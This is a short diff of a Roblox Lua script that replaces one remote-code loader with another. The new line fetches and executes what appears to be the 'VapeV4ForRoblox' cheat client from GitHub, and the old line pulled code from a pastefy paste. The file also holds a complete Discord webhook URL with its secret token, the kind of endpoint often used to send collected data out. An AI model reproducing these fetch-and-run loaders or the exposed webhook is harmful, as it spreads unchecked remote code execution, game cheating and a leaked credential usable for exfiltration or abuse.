@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
 
 local Webhook = "https://discord.com/api/webhooks/1441724937424474233/Frq9zydBK1KkOADON9vxHd3DbJSxW3mBwMB8BpA1E_ah8aj9hWn1hqGj8UzA7TdV8wf-"
 
